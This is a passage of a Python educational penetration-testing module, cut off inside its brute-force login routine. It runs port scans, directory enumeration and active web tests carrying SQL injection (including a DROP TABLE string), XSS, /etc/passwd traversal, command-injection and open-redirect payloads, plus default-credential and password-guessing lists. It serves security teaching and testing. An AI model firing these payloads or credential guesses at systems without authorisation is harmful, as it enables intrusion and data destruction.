"""
Penetration Testing Module for Cybersecurity Education

This module provides comprehensive penetration testing capabilities for
educational cybersecurity demonstrations. It performs active security testing
against running applications and infrastructure to identify exploitable
vulnerabilities.

Supported Testing Types:
- Information Gathering & Reconnaissance (nmap, gobuster, nikto)
- Vulnerability Discovery & Exploitation
- Web Application Testing (XSS, SQLi, CSRF, Authentication bypass)
- Network Service Testing
- Manual Testing Techniques
- Automated Exploit Testing
- Educational Vulnerability Demonstrations

Author: Secure Architecture Sandbox Testing Environment
License: MIT (Educational Use)
"""

import os
import subprocess
import requests
import time
import re
import socket
import tempfile
import urllib3
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from datetime import datetime
import logging
from urllib.parse import urljoin, urlparse

# Disable SSL warnings for testing purposes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


@dataclass
class PentestFinding:
    """Represents a security finding from penetration testing"""
    tool: str
    severity: str  # critical, high, medium, low, info
    title: str
    description: str
    target: str
    port: Optional[int] = None
    service: Optional[str] = None
    method: str = "GET"
    status_code: Optional[int] = None
    response_time: Optional[float] = None
    payload: Optional[str] = None
    evidence: Optional[str] = None
    exploitation_proof: Optional[str] = None
    cwe_id: Optional[str] = None
    cvss_score: Optional[float] = None
    owasp_category: Optional[str] = None
    confidence: str = "medium"  # high, medium, low
    risk_score: Optional[float] = None
    remediation: Optional[str] = None
    references: Optional[List[str]] = None
    attack_vector: Optional[str] = None
    impact: Optional[str] = None


@dataclass
class PentestReport:
    """Container for penetration testing results"""
    target: str
    test_duration: float
    timestamp: str
    findings: List[PentestFinding]
    tools_used: List[str]
    total_tests: int
    successful_exploits: int
    services_discovered: int
    endpoints_tested: int
    summary: Dict[str, Any]
    methodology: List[str]
    recommendations: List[str]

    def to_dict(self) -> Dict[str, Any]:
        """Convert report to dictionary format"""
        return {
            'target': self.target,
            'test_duration': self.test_duration,
            'timestamp': self.timestamp,
            'findings': [asdict(finding) for finding in self.findings],
            'tools_used': self.tools_used,
            'total_tests': self.total_tests,
            'successful_exploits': self.successful_exploits,
            'services_discovered': self.services_discovered,
            'endpoints_tested': self.endpoints_tested,
            'summary': self.summary,
            'methodology': self.methodology,
            'recommendations': self.recommendations
        }


class ReconnaissanceEngine:
    """Handles information gathering and reconnaissance"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'PenTest-Educational-Scanner/1.0'
        })
        self.session.verify = False  # For educational testing
        self.timeout = 10

    def port_scan(self, target: str, ports: List[int] = None) -> List[PentestFinding]:
        """Perform port scanning using nmap"""
        findings = []

        if ports is None:
            # Common ports for web applications and services
            ports = [22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995,
                     1433, 1521, 3306, 3389, 5000, 5432, 8000, 8080, 8443, 9090]

        try:
            # Use nmap if available
            if self._command_exists('nmap'):
                port_range = ','.join(map(str, ports))
                cmd = ['nmap', '-sS', '-sV', '-p',
                       port_range, target, '--open']

                result = subprocess.run(
                    cmd, capture_output=True, text=True, timeout=120)

                if result.returncode == 0:
                    findings.extend(self._parse_nmap_output(
                        result.stdout, target))
            else:
                # Fallback to basic socket testing
                findings.extend(self._socket_port_scan(target, ports))

        except subprocess.TimeoutExpired:
            logger.warning("Port scan timed out")
        except Exception as e:
            logger.error(f"Error during port scan: {e}")

        return findings

    def service_enumeration(self, target: str, port: int) -> List[PentestFinding]:
        """Enumerate services running on specific ports"""
        findings = []

        try:
            # Banner grabbing
            banner = self._grab_banner(target, port)
            if banner:
                finding = PentestFinding(
                    tool="banner_grabbing",
                    severity="info",
                    title=f"Service Banner Discovered on Port {port}",
                    description=f"Service banner revealed: {banner}",
                    target=target,
                    port=port,
                    evidence=banner,
                    confidence="high",
                    attack_vector="Information Disclosure",
                    impact="Service fingerprinting enables targeted attacks"
                )
                findings.append(finding)

            # HTTP-specific enumeration
            if port in [80, 443, 8000, 8080, 8443, 9090, 5000]:
                http_findings = self._enumerate_http_service(target, port)
                findings.extend(http_findings)

        except Exception as e:
            logger.debug(f"Error enumerating service on {target}:{port}: {e}")

        return findings

    def directory_enumeration(self, base_url: str) -> List[PentestFinding]:
        """Enumerate directories and files using gobuster and custom wordlists"""
        findings = []

        try:
            # Use gobuster if available
            if self._command_exists('gobuster'):
                gobuster_findings = self._run_gobuster(base_url)
                findings.extend(gobuster_findings)

            # Custom directory enumeration
            custom_findings = self._custom_directory_enum(base_url)
            findings.extend(custom_findings)

        except Exception as e:
            logger.error(f"Error during directory enumeration: {e}")

        return findings

    def _parse_nmap_output(self, output: str, target: str) -> List[PentestFinding]:
        """Parse nmap output to extract findings"""
        findings = []

        lines = output.split('\n')
        for line in lines:
            if '/tcp' in line and 'open' in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_info = parts[0]
                    port = int(port_info.split('/')[0])
                    service = parts[2] if len(parts) > 2 else "unknown"
                    version = ' '.join(parts[3:]) if len(parts) > 3 else ""

                    finding = PentestFinding(
                        tool="nmap",
                        severity="info",
                        title=f"Open Port Discovered: {port}",
                        description=f"Port {port} is open running {service}" +
                        (f" ({version})" if version else ""),
                        target=target,
                        port=port,
                        service=service,
                        evidence=line.strip(),
                        confidence="high",
                        attack_vector="Network Service",
                        impact="Open ports may provide attack surface"
                    )
                    findings.append(finding)

        return findings

    def _socket_port_scan(self, target: str, ports: List[int]) -> List[PentestFinding]:
        """Basic socket-based port scanning"""
        findings = []

        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, port))

                if result == 0:
                    finding = PentestFinding(
                        tool="socket_scan",
                        severity="info",
                        title=f"Open Port: {port}",
                        description=f"Port {port} is open and accepting connections",
                        target=target,
                        port=port,
                        confidence="medium",
                        attack_vector="Network Service",
                        impact="Open port may provide attack surface"
                    )
                    findings.append(finding)

                sock.close()

            except Exception:
                pass

        return findings

    def _grab_banner(self, target: str, port: int) -> Optional[str]:
        """Attempt to grab service banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))

            # Send basic requests for different services
            if port == 80:
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
            elif port == 443:
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
            elif port == 22:
                pass  # SSH banner comes automatically
            elif port == 25:
                pass  # SMTP banner comes automatically
            else:
                sock.send(b"\r\n")

            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()

            return banner if banner else None

        except Exception:
            return None

    def _enumerate_http_service(self, target: str, port: int) -> List[PentestFinding]:
        """Enumerate HTTP service details"""
        findings = []

        try:
            protocol = 'https' if port in [443, 8443] else 'http'
            base_url = f"{protocol}://{target}:{port}"

            response = self.session.get(base_url, timeout=self.timeout)

            # Check server header
            server_header = response.headers.get('Server', '')
            if server_header:
                finding = PentestFinding(
                    tool="http_enumeration",
                    severity="low",
                    title="Server Information Disclosure",
                    description=f"Server header reveals: {server_header}",
                    target=base_url,
                    port=port,
                    evidence=f"Server: {server_header}",
                    cwe_id="CWE-200",
                    confidence="high",
                    attack_vector="Information Disclosure",
                    impact="Server information helps attackers identify vulnerabilities"
                )
                findings.append(finding)

            # Check for common security headers
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'X-XSS-Protection': 'XSS filtering',
                'Strict-Transport-Security': 'HTTPS enforcement',
                'Content-Security-Policy': 'Content security policy'
            }

            missing_headers = []
            for header, description in security_headers.items():
                if header not in response.headers:
                    missing_headers.append(f"{header} ({description})")

            if missing_headers:
                finding = PentestFinding(
                    tool="http_enumeration",
                    severity="medium",
                    title="Missing Security Headers",
                    description=f"Missing security headers: {', '.join(missing_headers)}",
                    target=base_url,
                    port=port,
                    evidence=f"Missing: {missing_headers}",
                    cwe_id="CWE-16",
                    owasp_category="A05:2021 - Security Misconfiguration",
                    confidence="high",
                    attack_vector="Configuration Weakness",
                    impact="Missing headers increase attack surface"
                )
                findings.append(finding)

        except Exception as e:
            logger.debug(f"Error enumerating HTTP service: {e}")

        return findings

    def _run_gobuster(self, base_url: str) -> List[PentestFinding]:
        """Run gobuster for directory enumeration"""
        findings = []

        try:
            # Try multiple wordlist locations
            wordlist_paths = [
                "/usr/share/dirb/wordlists/common.txt",
                "/usr/share/dirb/wordlists/small.txt",
                "/usr/share/wordlists/dirb/common.txt",
                "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            ]

            wordlist_path = None
            for path in wordlist_paths:
                if os.path.exists(path):
                    wordlist_path = path
                    break

            if not wordlist_path:
                # Create a minimal wordlist
                wordlist_content = ("admin\ntest\napi\nlogin\nconfig\ndebug\n"
                                    "backup\n.git\n.env\nconsole\ndashboard\n"
                                    "upload\ndownload\nstatic\nassets")

                with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                    f.write(wordlist_content)
                    wordlist_path = f.name

            cmd = ['gobuster', 'dir', '-u', base_url,
                   '-w', wordlist_path, '-q', '-t', '20']

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=60)

            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'Status: 200' in line or 'Status: 301' in line or 'Status: 302' in line:
                        parts = line.split()
                        if parts:
                            path = parts[0]
                            status = None
                            size = None

                            for part in parts:
                                if part.startswith('Status:'):
                                    status = part.split(':')[1]
                                elif part.startswith('Size:'):
                                    size = part.split(':')[1]

                            severity = "medium" if status == "200" else "low"
                            full_url = urljoin(base_url, path)

                            finding = PentestFinding(
                                tool="gobuster",
                                severity=severity,
                                title=f"Directory/File Discovered: {path}",
                                description=f"Accessible path found: {path} (Status: {status})",
                                target=full_url,
                                evidence=line.strip(),
                                confidence="high",
                                attack_vector="Information Disclosure",
                                impact="Exposed directories may contain sensitive information"
                            )
                            findings.append(finding)

            # Clean up temporary wordlist if created
            if not any(wordlist_path == path for path in wordlist_paths):
                os.unlink(wordlist_path)

        except subprocess.TimeoutExpired:
            logger.warning("Gobuster timed out")
        except Exception as e:
            logger.error(f"Error running gobuster: {e}")

        return findings

    def _custom_directory_enum(self, base_url: str) -> List[PentestFinding]:
        """Custom directory enumeration for common paths"""
        findings = []

        # Common paths to check
        common_paths = [
            "/admin", "/test", "/debug", "/console", "/api", "/login",
            "/config", "/backup", "/.git", "/.env", "/robots.txt",
            "/sitemap.xml", "/wp-admin", "/phpmyadmin", "/dashboard"
        ]

        for path in common_paths:
            try:
                url = urljoin(base_url, path)
                response = self.session.get(url, timeout=5)

                if response.status_code in [200, 301, 302]:
                    severity = "high" if path in [
                        "/console", "/debug", "/.env"] else "medium"

                    finding = PentestFinding(
                        tool="custom_enum",
                        severity=severity,
                        title=f"Sensitive Path Accessible: {path}",
                        description=f"Potentially sensitive path is accessible: {path}",
                        target=url,
                        status_code=response.status_code,
                        evidence=f"HTTP {response.status_code} response",
                        confidence="high",
                        attack_vector="Information Disclosure",
                        impact="Exposed paths may contain sensitive information or functionality"
                    )
                    findings.append(finding)

            except Exception:
                pass

        return findings

    def _command_exists(self, command: str) -> bool:
        """Check if a command exists in the system PATH"""
        try:
            subprocess.run([command, '--help'],
                           capture_output=True, timeout=5, check=False)
            return True
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False


class VulnerabilityScanner:
    """Scans for specific vulnerability types"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'PenTest-Educational-Scanner/1.0'
        })
        self.session.verify = False
        self.timeout = 10

    def scan_web_vulnerabilities(self, base_url: str) -> List[PentestFinding]:
        """Comprehensive web vulnerability scanning"""
        findings = []

        try:
            # Test for common vulnerabilities
            findings.extend(self._test_debug_console(base_url))
            findings.extend(self._test_open_redirect(base_url))
            findings.extend(self._test_sql_injection(base_url))
            findings.extend(self._test_xss(base_url))
            findings.extend(self._test_authentication(base_url))
            findings.extend(self._test_session_management(base_url))
            findings.extend(self._test_csrf(base_url))
            findings.extend(self._test_file_inclusion(base_url))
            findings.extend(self._test_command_injection(base_url))
            findings.extend(self._test_brute_force_login(base_url))

        except Exception as e:
            logger.error(f"Error during vulnerability scanning: {e}")

        return findings

    def _test_debug_console(self, base_url: str) -> List[PentestFinding]:
        """Test for exposed debug console (like Werkzeug)"""
        findings = []

        debug_paths = ['/console', '/debug', '/debug/console']

        for path in debug_paths:
            try:
                url = urljoin(base_url, path)
                response = self.session.get(url, timeout=self.timeout)

                # Look for debug console indicators
                debug_indicators = [
                    'Werkzeug Debugger',
                    'Debug Console',
                    'Interactive Console',
                    'Python Console',
                    'Debug Mode'
                ]

                for indicator in debug_indicators:
                    if indicator in response.text:
                        finding = PentestFinding(
                            tool="debug_console_scanner",
                            severity="critical",
                            title="Debug Console Exposed",
                            description=f"Debug console accessible at {path}. "
                            f"This provides interactive shell access.",
                            target=url,
                            status_code=response.status_code,
                            evidence=f"Debug indicator: {indicator}",
                            exploitation_proof=f"Console accessible at {url}",
                            cwe_id="CWE-489",
                            cvss_score=10.0,
                            owasp_category="A05:2021 - Security Misconfiguration",
                            confidence="high",
                            risk_score=10.0,
                            attack_vector="Network",
                            impact="Complete server compromise, remote code execution",
                            remediation="Disable debug mode in production"
                        )
                        findings.append(finding)
                        break

            except Exception as e:
                logger.debug(f"Error testing debug console: {e}")

        return findings

    def _test_open_redirect(self, base_url: str) -> List[PentestFinding]:
        """Test for open redirect vulnerabilities"""
        findings = []

        # Test payloads for open redirect
        redirect_payloads = [
            'http://evil.com',
            'https://attacker.example.com',
            '//evil.com',
            '/\\evil.com',
            'javascript:alert("redirect")'
        ]

        # Common redirect parameters
        redirect_params = ['url', 'redirect',
                           'next', 'goto', 'target', 'return']

        for param in redirect_params:
            for payload in redirect_payloads:
                try:
                    params = {param: payload}
                    response = self.session.get(base_url, params=params,
                                                timeout=self.timeout, allow_redirects=False)

                    # Check for redirect indicators
                    if (response.status_code in [301, 302, 303, 307, 308] and
                        'Location' in response.headers and
                            payload in response.headers['Location']):

                        finding = PentestFinding(
                            tool="redirect_scanner",
                            severity="critical",
                            title=f"Open Redirect in Parameter '{param}'",
                            description=f"Open redirect vulnerability detected. "
                            f"Application redirects to untrusted URLs.",
                            target=response.url,
                            payload=payload,
                            evidence=f"Redirects to: {response.headers['Location']}",
                            exploitation_proof=f"Parameter: {param}, Payload: {payload}",
                            cwe_id="CWE-601",
                            cvss_score=9.0,
                            owasp_category="A01:2021 - Broken Access Control",
                            confidence="high",
                            risk_score=9.0,
                            attack_vector="Network",
                            impact="Phishing attacks, credential theft, malware distribution",
                            remediation="Implement URL validation and whitelist"
                        )
                        findings.append(finding)
                        break

                    # Also check response body for redirect text
                    elif payload in response.text:
                        finding = PentestFinding(
                            tool="redirect_scanner",
                            severity="high",
                            title=f"Potential Open Redirect in Parameter '{param}'",
                            description=f"URL parameter value reflected in response. "
                            f"May enable open redirect attacks.",
                            target=response.url,
                            payload=payload,
                            evidence=f"Payload reflected in response body",
                            exploitation_proof=f"Parameter: {param}, Payload: {payload}",
                            cwe_id="CWE-601",
                            cvss_score=7.5,
                            owasp_category="A01:2021 - Broken Access Control",
                            confidence="medium",
                            risk_score=7.5,
                            attack_vector="Network",
                            impact="Phishing attacks via reflected redirect URLs",
                            remediation="Implement URL validation and whitelist"
                        )
                        findings.append(finding)
                        break

                except Exception as e:
                    logger.debug(f"Error testing open redirect: {e}")

        return findings

    def _test_sql_injection(self, base_url: str) -> List[PentestFinding]:
        """Test for SQL injection vulnerabilities"""
        findings = []

        # SQL injection payloads
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "1' UNION SELECT NULL--",
            "admin'--",
            "' OR '1'='1' /*",
            "') OR ('1'='1"
        ]

        # Test common parameter names for GET requests
        test_params = ['id', 'user', 'username',
                       'search', 'q', 'name', 'email']

        # Test GET parameters
        for param in test_params:
            for payload in sqli_payloads:
                try:
                    params = {param: payload}
                    response = self.session.get(
                        base_url, params=params, timeout=self.timeout)

                    if self._check_sql_errors(response, param, payload):
                        findings.append(self._create_sqli_finding(
                            response, param, payload, "GET"))
                        break

                except Exception as e:
                    logger.debug(f"Error testing SQL injection (GET): {e}")

        # Test POST forms
        try:
            response = self.session.get(base_url, timeout=self.timeout)

            # Look for forms with common SQL-vulnerable fields
            if '<form' in response.text.lower():
                form_fields = ['username', 'password', 'email', 'search', 'id']

                for field in form_fields:
                    for payload in sqli_payloads:
                        try:
                            form_data = {field: payload}
                            if field == 'username':
                                # Add password for login forms
                                form_data['password'] = 'test'

                            post_response = self.session.post(
                                base_url, data=form_data, timeout=self.timeout)

                            if self._check_sql_errors(post_response, field, payload):
                                findings.append(self._create_sqli_finding(
                                    post_response, field, payload, "POST"))
                                break

                        except Exception as e:
                            logger.debug(
                                f"Error testing SQL injection (POST): {e}")

        except Exception as e:
            logger.debug(f"Error testing forms for SQL injection: {e}")

        return findings

    def _check_sql_errors(self, response, param, payload):
        """Check response for SQL error indicators"""
        sql_errors = [
            "sqlite3.OperationalError",
            "mysql error",
            "postgresql error",
            "ora-\\d+",
            "syntax error",
            "sqlite error",
            "database error",
            "sql error",
            "OperationalError",
            "IntegrityError",
            "DatabaseError"
        ]

        for error_pattern in sql_errors:
            if re.search(error_pattern, response.text, re.IGNORECASE):
                return True
        return False

    def _create_sqli_finding(self, response, param, payload, method):
        """Create SQL injection finding"""
        return PentestFinding(
            tool="sql_injection_scanner",
            severity="critical",
            title=f"SQL Injection in Parameter '{param}' ({method})",
            description=f"SQL injection vulnerability detected in parameter '{param}'. "
            f"Database error exposed when injecting: {payload}",
            target=response.url,
            method=method,
            payload=payload,
            evidence=f"SQL error detected in response",
            exploitation_proof=f"Parameter: {param}, Payload: {payload}, Method: {method}",
            cwe_id="CWE-89",
            cvss_score=9.0,
            owasp_category="A03:2021 - Injection",
            confidence="high",
            risk_score=9.0,
            attack_vector="Network",
            impact="Complete database compromise, data exfiltration",
            remediation="Use parameterized queries instead of string concatenation"
        )

    def _test_xss(self, base_url: str) -> List[PentestFinding]:
        """Test for Cross-Site Scripting vulnerabilities"""
        findings = []

        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>"
        ]

        test_params = ['q', 'search', 'name', 'comment', 'message', 'input']

        for param in test_params:
            for payload in xss_payloads:
                try:
                    params = {param: payload}
                    response = self.session.get(
                        base_url, params=params, timeout=self.timeout)

                    # Check if payload is reflected in response
                    if payload in response.text:
                        finding = PentestFinding(
                            tool="xss_scanner",
                            severity="high",
                            title=f"Reflected XSS in Parameter '{param}'",
                            description=f"Reflected XSS vulnerability detected in parameter '{param}'. "
                            f"User input is reflected without proper sanitization.",
                            target=response.url,
                            payload=payload,
                            evidence=f"Payload reflected in response",
                            exploitation_proof=f"Parameter: {param}, Payload: {payload}",
                            cwe_id="CWE-79",
                            cvss_score=7.1,
                            owasp_category="A03:2021 - Injection",
                            confidence="high",
                            risk_score=7.0,
                            attack_vector="Network",
                            impact="Account takeover, credential theft, malware distribution"
                        )
                        findings.append(finding)
                        break

                except Exception as e:
                    logger.debug(f"Error testing XSS: {e}")

        return findings

    def _test_authentication(self, base_url: str) -> List[PentestFinding]:
        """Test authentication mechanisms"""
        findings = []

        # Common login endpoints
        login_paths = ['/login', '/admin',
                       '/signin', '/auth', '/authentication']

        for path in login_paths:
            try:
                login_url = urljoin(base_url, path)
                response = self.session.get(login_url, timeout=self.timeout)

                if response.status_code == 200:
                    # Test for default credentials
                    default_creds = [
                        ('admin', 'admin'),
                        ('admin', 'password'),
                        ('admin', '123456'),
                        ('test', 'test'),
                        ('guest', 'guest'),
                        ('root', 'root')
                    ]

                    for username, password in default_creds:
                        auth_data = {
                            'username': username,
                            'password': password,
                            'login': 'Login'
                        }

                        auth_response = self.session.post(
                            login_url, data=auth_data, timeout=self.timeout)

                        # Check for successful authentication indicators
                        success_indicators = [
                            'dashboard', 'welcome', 'logout', 'profile',
                            'admin panel', 'control panel'
                        ]

                        if any(indicator in auth_response.text.lower() for indicator in success_indicators):
                            finding = PentestFinding(
                                tool="auth_scanner",
                                severity="critical",
                                title=f"Default Credentials: {username}/{password}",
                                description=f"Default credentials accepted: {username}/{password}",
                                target=login_url,
                                evidence=f"Successful login with {username}/{password}",
                                exploitation_proof=f"POST {login_url} with {username}:{password}",
                                cwe_id="CWE-798",
                                cvss_score=9.8,
                                owasp_category="A07:2021 - Identification and Authentication Failures",
                                confidence="high",
                                risk_score=9.8,
                                attack_vector="Network",
                                impact="Complete account takeover, unauthorized access"
                            )
                            findings.append(finding)

            except Exception as e:
                logger.debug(f"Error testing authentication: {e}")

        return findings

    def _test_session_management(self, base_url: str) -> List[PentestFinding]:
        """Test session management security"""
        findings = []

        try:
            response = self.session.get(base_url, timeout=self.timeout)

            # Check cookie security
            for cookie in response.cookies:
                cookie_findings = []

                if not cookie.secure and 'https' in base_url:
                    cookie_findings.append("Missing Secure flag")

                if not cookie.has_nonstandard_attr('HttpOnly'):
                    cookie_findings.append("Missing HttpOnly flag")

                if not cookie.has_nonstandard_attr('SameSite'):
                    cookie_findings.append("Missing SameSite attribute")

                if cookie_findings:
                    finding = PentestFinding(
                        tool="session_scanner",
                        severity="medium",
                        title=f"Insecure Cookie: {cookie.name}",
                        description=f"Cookie '{cookie.name}' has security issues: {', '.join(cookie_findings)}",
                        target=base_url,
                        evidence=f"Cookie issues: {cookie_findings}",
                        cwe_id="CWE-614",
                        owasp_category="A05:2021 - Security Misconfiguration",
                        confidence="high",
                        attack_vector="Network",
                        impact="Session hijacking, CSRF attacks"
                    )
                    findings.append(finding)

        except Exception as e:
            logger.debug(f"Error testing session management: {e}")

        return findings

    def _test_csrf(self, base_url: str) -> List[PentestFinding]:
        """Test for CSRF vulnerabilities"""
        findings = []

        try:
            response = self.session.get(base_url, timeout=self.timeout)

            # Look for forms without CSRF tokens
            if '<form' in response.text.lower():
                # Simple check for common CSRF token names
                csrf_patterns = [
                    r'csrf_token',
                    r'_token',
                    r'authenticity_token',
                    r'__RequestVerificationToken'
                ]

                has_csrf_token = any(re.search(pattern, response.text, re.IGNORECASE)
                                     for pattern in csrf_patterns)

                if not has_csrf_token:
                    finding = PentestFinding(
                        tool="csrf_scanner",
                        severity="medium",
                        title="Missing CSRF Protection",
                        description="Forms detected without apparent CSRF token protection",
                        target=base_url,
                        evidence="Forms found without CSRF tokens",
                        cwe_id="CWE-352",
                        owasp_category="A01:2021 - Broken Access Control",
                        confidence="medium",
                        attack_vector="Network",
                        impact="Cross-site request forgery attacks"
                    )
                    findings.append(finding)

        except Exception as e:
            logger.debug(f"Error testing CSRF: {e}")

        return findings

    def _test_file_inclusion(self, base_url: str) -> List[PentestFinding]:
        """Test for file inclusion vulnerabilities"""
        findings = []

        # File inclusion payloads
        lfi_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../../../etc/passwd%00"
        ]

        test_params = ['file', 'include', 'page', 'template', 'doc', 'path']

        for param in test_params:
            for payload in lfi_payloads:
                try:
                    params = {param: payload}
                    response = self.session.get(
                        base_url, params=params, timeout=self.timeout)

                    # Look for file inclusion indicators
                    lfi_indicators = [
                        r'root:.*?:/bin/bash',
                        r'#.*localhost',
                        r'daemon:.*?:/usr/sbin/nologin'
                    ]

                    for indicator in lfi_indicators:
                        if re.search(indicator, response.text):
                            finding = PentestFinding(
                                tool="lfi_scanner",
                                severity="critical",
                                title=f"Local File Inclusion in Parameter '{param}'",
                                description=f"Local file inclusion vulnerability detected in parameter '{param}'",
                                target=response.url,
                                payload=payload,
                                evidence=f"File content detected: {indicator}",
                                exploitation_proof=f"Parameter: {param}, Payload: {payload}",
                                cwe_id="CWE-22",
                                cvss_score=8.6,
                                owasp_category="A01:2021 - Broken Access Control",
                                confidence="high",
                                risk_score=8.5,
                                attack_vector="Network",
                                impact="Arbitrary file access, information disclosure"
                            )
                            findings.append(finding)
                            break

                except Exception as e:
                    logger.debug(f"Error testing LFI: {e}")

        return findings

    def _test_command_injection(self, base_url: str) -> List[PentestFinding]:
        """Test for command injection vulnerabilities"""
        findings = []

        # Command injection payloads
        cmd_payloads = [
            "; whoami",
            "| whoami",
            "&& whoami",
            "`whoami`",
            "$(whoami)",
            "; id",
            "| id",
            "&& id"
        ]

        test_params = ['cmd', 'command', 'exec',
                       'system', 'run', 'ping', 'host']

        for param in test_params:
            for payload in cmd_payloads:
                try:
                    params = {param: payload}
                    response = self.session.get(
                        base_url, params=params, timeout=self.timeout)

                    # Look for command execution indicators
                    cmd_indicators = [
                        r'uid=\d+.*gid=\d+',
                        r'root|daemon|www-data',
                        r'[a-zA-Z0-9]+:\$'
                    ]

                    for indicator in cmd_indicators:
                        if re.search(indicator, response.text):
                            finding = PentestFinding(
                                tool="cmd_injection_scanner",
                                severity="critical",
                                title=f"Command Injection in Parameter '{param}'",
                                description=f"Command injection vulnerability detected in parameter '{param}'",
                                target=response.url,
                                payload=payload,
                                evidence=f"Command output detected: {indicator}",
                                exploitation_proof=f"Parameter: {param}, Payload: {payload}",
                                cwe_id="CWE-78",
                                cvss_score=9.8,
                                owasp_category="A03:2021 - Injection",
                                confidence="high",
                                risk_score=9.8,
                                attack_vector="Network",
                                impact="Remote code execution, complete system compromise"
                            )
                            findings.append(finding)
                            break

                except Exception as e:
                    logger.debug(f"Error testing command injection: {e}")

        return findings

    def _test_brute_force_login(self, base_url: str) -> List[PentestFinding]:
        """Test for weak authentication using basic dictionary attack"""
        findings = []

        # Top 100 common usernames (reduced for educational purposes)
        common_usernames = [
            'admin', 'administrator', 'root', 'user', 'test', 'guest', 'demo',
            'admin123', 'administrator123', 'sa', 'oracle', 'web', 'www',
            'ftp', 'mail', 'email', 'operator', 'manager', 'service',
            'support', 'help', 'apache', 'nginx', 'mysql', 'postgres',
            'tomcat', 'jenkins', 'deploy', 'developer', 'devops', 'backup',
            'testuser', 'temp', 'training', 'sales', 'marketing', 'finance',
            'hr', 'it', 'system', 'network', 'security', 'audit', 'monitor',
            'public', 'private', 'internal', 'external', 'client', 'customer'
        ]

        # Top 100 common passwords (reduced for educational purposes)
        common_passwords = [
            'password', '123456', 'password123', 'admin', '12345678',
            'qwerty', 'abc123', 'Password1', 'password1', '123456789',
            'welcome', 'login', 'pass', 'secret', 'root', 'toor', 'admin123',
            'administrator', 'guest', 'test', 'demo', 'user', 'default',
            'changeme', 'letmein', 'monkey', '1234567', 'dragon', 'master',
            'shadow', 'superman', 'michael', 'jordan', 'harley', 'ranger',
            'charlie', 'jennifer', 'football', 'soccer', 'baseball',
            'hockey', 'tennis', 'basketball', 'swimming', 'computer',
            'internet', 'service', 'server', 'system', 'manager'
        ]

        # Look for login forms or endpoints
        login_paths = ['/', '/login', '/admin', '/auth', '/signin', '/logon']

        for path in login_paths:
            try:
                login_url = urljoin(base_url, path)
                response = self.session.get(login_url, timeout=self.timeout)

                if response.status_code == 200 and ('login' in response.text.lower() or
                                                    'password' in response.text.lower() or 'username' in response.text.lower()):

                    # Try a limited set of common combinations for educational demo
                    test_combinations = []

                    # Test top 10 users with top 10 passwords (100 combinations)
                    for username in common_usernames[:10]:
                        for password in common_passwords[:10]:
                            test_combinations.append((username, password))

                    # Try each combination
                    successful_logins = []
                    tested_count = 0

                    for username, password in test_combinations:
                        if tested_count >= 20:  # Limit to 20 tests for demo
                            break

                        try:
                            login_data = {
                                'username': username,
                                'password': password,
                                'user': username,
                                'pass': password,
                                'email': username,
                                'login': username
                            }

                            post_response = self.session.post(
                                login_url, data=login_data, timeout=self.timeout,
                                allow_redirects=False)

                            # Check for successful login indicators
                            success_indicators = [
                                'welcome', 'dashboard', 'logout', 'profile',
                                'success', 'admin panel', 'user panel',
                                'home', 'account', 'settings'
                            ]

                            login_failed_indicators = [
                                'invalid', 'incorrect', 'failed', 'error',
                                'wrong', 'denied', 'unauthorized'
                            ]

                            response_text = post_response.text.lower()

                            # Check if we have success indicators and no failure indicators
                            has_success = any(
                                indicator in response_text for indicator in success_indicators)
                            has_failure = any(
                                indicator in response_text for indicator in login_failed_indicators)

                            if (post_response.status_code in [200, 302, 301] and
                                (has_success and not has_failure) or
                                    post_response.status_code in [302, 301]):

                                successful_logins.append((username, password))

                            tested_count += 1
                            time.sleep(0.1)  # Small delay to be respectful

                        except Exception as e:
                            logger.debug(
                                f"Error testing login {username}:{password}: {e}")

                    # Create findings for successful logins
                    if successful_logins:
                        for username, password in successful_logins:
                            finding = PentestFinding(
                                tool="brute_force_scanner",
                                severity="high",
                                title=f"Weak Authentication: {username}:{password}",
                                description=f"Successfully authenticated using weak credentials: {username}:{password}",
                                target=login_url,
                                evidence=f"Login successful with {username}:{password}",
                                exploitation_proof=f"Username: {username}, Password: {password}",
                                cwe_id="CWE-521",
                                cvss_score=8.0,
                                owasp_category="A07:2021 - Identification and Authentication Failures",
                                confidence="high",
                                risk_score=8.0,
                                attack_vector="Network",
                                impact="Unauthorized access to application and user data",
                                remediation="Enforce strong password policies and account lockout mechanisms"
                            )
                            findings.append(finding)

                    # Create informational finding about the brute force test
                    elif tested_count > 0:
                        finding = PentestFinding(
                            tool="brute_force_scanner",
                            severity="info",
                            title=f"Brute Force Testing Completed",
                            description=f"Tested {tested_count} common username/password combinations without success",
                            target=login_url,
